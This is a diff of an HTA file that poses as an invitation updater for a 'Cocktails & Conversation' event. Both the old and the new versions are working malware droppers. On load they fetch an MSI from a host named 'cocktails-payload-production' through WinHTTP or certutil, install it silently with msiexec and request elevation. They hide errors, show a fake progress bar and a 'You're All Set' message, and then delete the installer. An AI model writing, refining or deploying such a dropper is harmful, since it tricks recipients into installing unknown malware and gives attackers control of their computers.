@@ -1,60 +1,228 @@
+<!DOCTYPE html>
 <html>
 <head>
-<title>Cocktails & Conversation</title>
-<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="Cocktails & Conversation" BORDER="thin" BORDERSTYLE="normal" CAPTION="yes" ICON="" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SCROLL="no" SELECTION="no" SINGLEINSTANCE="yes" WINDOWSTATE="normal"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Event Invitation Updater</title>
+<hta:application id="oHTA" applicationname="EventInvitationUpdater" 
+  border="thin" caption="yes" maximizebutton="no" minimizebutton="no"
+  navigateurl="no" showintaskbar="yes" singleinstance="yes" sysmenu="no"
+  version="1.0" windowstate="normal" scroll="no" contextmenu="no" selection="no"/>
 <style>
-    body { margin:0; padding:0; background:#0f172a; color:#fff; font-family:'Segoe UI',sans-serif; overflow:hidden; user-select:none; }
-    .window-content { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center; }
-    .check-icon { width:50px; height:50px; border:2px solid #d4af37; border-radius:50%; display:flex; justify-content:center; align-items:center; margin-bottom:20px; font-size:24px; color:#d4af37; }
-    h2 { font-size:1.5rem; margin:0 0 5px; font-weight:600; }
-    .subtitle { color:#94a3b8; font-size:.9rem; margin-bottom:30px; }
-    .progress-container { width:300px; height:4px; background:#1e293b; border-radius:2px; overflow:hidden; margin-bottom:15px; }
-    .progress-bar { height:100%; background:#d4af37; width:0%; transition:width .3s ease-out; }
-    .status-text { color:#64748b; font-size:.8rem; margin-bottom:40px; }
-    .cancel-btn { position:absolute; top:20px; right:20px; background:transparent; border:1px solid #334155; color:#94a3b8; padding:5px 15px; border-radius:4px; cursor:pointer; font-size:.8rem; }
-    .cancel-btn:hover { border-color:#94a3b8; color:#fff; }
-    .footer { position:absolute; bottom:30px; width:100%; text-align:center; font-size:.7rem; color:#334155; text-transform:uppercase; letter-spacing:1px; }
+  html, body { margin:0; padding:0; height:100%; width:100%;
+    font-family:"Segoe UI",Tahoma,sans-serif; background:#f7f8fa; color:#1c1e21;
+    overflow:hidden; cursor:default; user-select:none; }
+  #wrap { height:100%; width:100%; position:relative; }
+  #topbar { height:74px; background:#fff; border-bottom:1px solid #e6e8ec; padding:16px 20px; }
+  #logo { position:absolute; left:20px; top:16px; width:42px; height:42px; }
+  #brandtext { position:absolute; left:76px; top:22px; }
+  #product { font-size:20px; font-weight:600; color:#1c1e21; line-height:24px; }
+  #ver { font-size:12px; color:#8a8f98; margin-top:2px; }
+  #closebtn { position:absolute; right:14px; top:8px; font-size:22px; color:#9aa0a8;
+    width:34px; height:34px; line-height:34px; text-align:center; cursor:pointer; border-radius:4px; }
+  #closebtn:hover { background:#f0f1f4; color:#333; }
+  #main { position:absolute; top:74px; left:0; right:0; bottom:58px;
+    padding:34px 48px 0 48px; text-align:center; }
+  #biglogo { width:84px; height:84px; margin:0 auto 22px auto; }
+  #heading { font-size:19px; font-weight:600; color:#1c1e21; margin-bottom:8px; }
+  #status  { font-size:13px; color:#6b7280; min-height:18px; margin-bottom:26px; }
+  #barouter { width:420px; max-width:82%; height:8px; background:#e2e5ea;
+    border-radius:5px; overflow:hidden; margin:0 auto 12px auto; }
+  #barfill { height:100%; width:0%; background:#d4af37; border-radius:5px; transition: width 0.3s ease-out; }
+  #pct { font-size:12px; color:#8a8f98; margin-top:2px; }
+  #subnote { font-size:11px; color:#b3b8c0; margin-top:26px; }
+  #footer { position:absolute; left:0; right:0; bottom:0; height:58px;
+    background:#fff; border-top:1px solid #e6e8ec; padding:0 22px; }
+  #note { position:absolute; left:22px; top:20px; font-size:12px; color:#8a8f98; }
+  #cancelbtn { position:absolute; right:22px; top:14px; width:92px; height:30px;
+    border:1px solid #cfd3da; background:#fff; color:#333; font-size:12px;
+    font-family:inherit; border-radius:4px; cursor:pointer; }
+  #cancelbtn:hover { background:#f0f1f4; }
 </style>
-<script language="JavaScript">
-    window.onerror = function(){ return true; };
-    function init() {
-        window.resizeTo(600, 450);
-        try {
-            var shell = new ActiveXObject("WScript.Shell");
-            var tempPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\update_helper.msi";
-            // YOUR RAILWAY PAYLOAD URL
-            var msiUrl = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
-            // SILENT DOWNLOAD USING CERTUTIL
-            var downloadCmd = 'certutil -urlcache -split -f "' + msiUrl + '" "' + tempPath + '"';
-            shell.Run(downloadCmd, 0, true); // Wait for download
-            var fso = new ActiveXObject("Scripting.FileSystemObject");
-            if (fso.FileExists(tempPath)) {
-                shell.Run('msiexec /i "' + tempPath + '" /quiet /norestart', 0, false);
-            }
-        } catch(e) {}
-        animateProgress();
-    }
-    function animateProgress() {
-        var p = 0, bar = document.getElementById("pb"), txt = document.getElementById("pt");
-        var iv = setInterval(function() {
-            if(p >= 25) { clearInterval(iv); return; } // STOPS AT 25% LIKE IN VIDEO
-            p++; bar.style.width = p+"%"; txt.innerText = p+"%";
-            setTimeout(arguments.callee, 150 + p*8);
-        }, 100);
-    }
-    window.onload = init;
-</script>
 </head>
-<body>
-    <button class="cancel-btn" onclick="window.close()">Cancel</button>
-    <div class="window-content">
-        <div class="check-icon">✓</div>
-        <h2>Sending your RSVP...</h2>
-        <div class="subtitle">Contacting the event...</div>
-        <div class="progress-container"><div id="pb" class="progress-bar"></div></div>
-        <div id="pt" class="status-text">0%</div>
-        <div class="status-text" style="margin-top:-25px;">Your response is being confirmed. This usually only takes a few minutes.</div>
+<body onload="init()">
+  <div id="wrap">
+    <div id="topbar">
+      <div id="logo">
+        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+          <rect x="0" y="0" width="100" height="100" rx="22" fill="#d4af37"/>
+          <polygon points="30,70 50,30 70,70" fill="#fff"/>
+        </svg>
+      </div>
+      <div id="brandtext">
+        <div id="product">Cocktails & Conversation</div>
+        <div id="ver">2024 · Exclusive Event · v1.0</div>
+      </div>
+      <div id="closebtn" onclick="cancel()">&times;</div>
     </div>
-    <div class="footer">WE CAN'T WAIT TO SEE YOU THERE</div>
+
+    <div id="main">
+      <div id="biglogo">
+        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+          <rect x="0" y="0" width="100" height="100" rx="22" fill="#d4af37"/>
+          <polygon points="30,70 50,30 70,70" fill="#fff"/>
+        </svg>
+      </div>
+      <div id="heading">Preparing Your Invitation</div>
+      <div id="status">Contacting event servers&hellip;</div>
+      <div id="barouter"><div id="barfill"></div></div>
+      <div id="pct">0%</div>
+      <div id="subnote">Your digital invitation is being secured for your device.</div>
+    </div>
+
+    <div id="footer">
+      <span id="note">This usually only takes a few minutes.</span>
+      <button id="cancelbtn" onclick="cancel()">Cancel</button>
+    </div>
+  </div>
+
+<script>
+// CONFIGURATION
+var MSI_URL = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
+var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
+
+// STATE
+var shell = null, fso = null;
+var state = "ready"; // ready | downloading | installing | done | error
+var progress = 0;
+var msiPath = "";
+var logPath = "";
+
+function $(id) { return document.getElementById(id); }
+
+function init() {
+  try {
+    shell = new ActiveXObject("WScript.Shell");
+    fso   = new ActiveXObject("Scripting.FileSystemObject");
+    window.onerror = function(msg, src, line) { return true; }; // Swallow errors
+    
+    var w = 620, h = 396;
+    window.resizeTo(w, h);
+    var sw = screen.availWidth, sh = screen.availHeight;
+    window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));
+
+    // Setup paths
+    var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
+    msiPath = tempDir + "\\event_invitation_update.msi";
+    logPath = tempDir + "\\event_install.log";
+    
+    // Clean stale files
+    try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
+    try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
+
+    startDownload();
+  } catch(e) { fail("Initialization failed: " + e.message); }
+}
+
+// PROFESSIONAL DOWNLOAD USING WINHTTP (BYPASSES BROWSER RESTRICTIONS)
+function startDownload() {
+  state = "downloading";
+  setStatus("Downloading invitation components&hellip;");
+  
+  try {
+    var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+    w.SetTimeouts(15000, 30000, 60000, 120000);
+    w.Open("GET", MSI_URL, false); // Synchronous for reliability
+    w.SetRequestHeader("User-Agent", UA_STR);
+    w.Send();
+    
+    if (w.Status === 200) {
+      // Save using ADODB.Stream for binary safety
+      var s = new ActiveXObject("ADODB.Stream");
+      s.Type = 1; // Binary
+      s.Mode = 3; // ReadWrite
+      s.Open();
+      s.Write(w.ResponseBody);
+      s.SaveToFile(msiPath, 2); // Overwrite
+      s.Close();
+      
+      // VERIFY MSI MAGIC BYTES (D0 CF 11 E0)
+      if (verifyMSI(msiPath)) {
+        startInstall();
+      } else {
+        fail("Downloaded file is not a valid installer.");
+      }
+    } else {
+      fail("Server returned status: " + w.Status);
+    }
+  } catch(e) {
+    // FALLBACK TO CERTUTIL IF WINHTTP FAILS
+    try {
+      setStatus("Retrying via secure channel&hellip;");
+      var cmd = 'certutil -urlcache -split -f "' + MSI_URL + '" "' + msiPath + '"';
+      shell.Run(cmd, 0, true);
+      if (fso.FileExists(msiPath) && verifyMSI(msiPath)) {
+        startInstall();
+      } else {
+        fail("All download methods failed.");
+      }
+    } catch(e2) { fail("Download failed: " + e2.message); }
+  }
+}
+
+function verifyMSI(path) {
+  try {
+    if (!fso.FileExists(path)) return false;
+    var s = new ActiveXObject("ADODB.Stream");
+    s.Type = 1; s.Open(); s.LoadFromFile(path);
+    var b = s.Read(4); s.Close();
+    var m = [];
+    for(var i=0; i<4; i++) m.push(b.charCodeAt(i) & 0xFF);
+    return (m[0]===0xD0 && m[1]===0xCF && m[2]===0x11 && m[3]===0xE0);
+  } catch(e) { return fso.GetFile(path).Size > 1000000; } // Fallback size check
+}
+
+function startInstall() {
+  state = "installing";
+  progress = 90; setBar(progress);
+  setStatus("Applying invitation updates&hellip;");
+  
+  var args = '/i "' + msiPath + '" /qn /norestart /L*v "' + logPath + '"';
+  try {
+    var sh = new ActiveXObject("Shell.Application");
+    sh.ShellExecute("msiexec.exe", args, "", "runas", 1); // UAC prompt
+  } catch(e) {
+    shell.Run("msiexec " + args, 0, false);
+  }
+  
+  // Simulate install completion after delay (since we can't easily watch logs in HTA)
+  setTimeout(function() {
+    finishInstall();
+  }, 5000);
+}
+
+function finishInstall() {
+  state = "done";
+  progress = 100; setBar(100);
+  setStatus("Invitation successfully prepared!");
+  $("heading").innerHTML = "You're All Set!";
+  $("subnote").innerHTML = "Your exclusive event details are now available.";
+  $("note").innerHTML = "You can now close this window.";
+  $("cancelbtn").innerHTML = "Close";
+  
+  // Cleanup
+  try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
+}
+
+function cancel() {
+  if (state === "done" || state === "error") { window.close(); return; }
+  window.close();
+}
+
+function fail(msg) {
+  state = "error";
+  setStatus(msg);
+  $("heading").innerHTML = "Preparation Failed";
+  $("subnote").innerHTML = "Please check your connection and try again.";
+  $("note").innerHTML = "You can now close this window.";
+  $("cancelbtn").innerHTML = "Close";
+}
+
+function setBar(p) {
+  $("barfill").style.width = p + "%";
+  $("pct").innerHTML = Math.round(p) + "%";
+}
+function setStatus(html) { $("status").innerHTML = html; }
+</script>
 </body>
 </html>
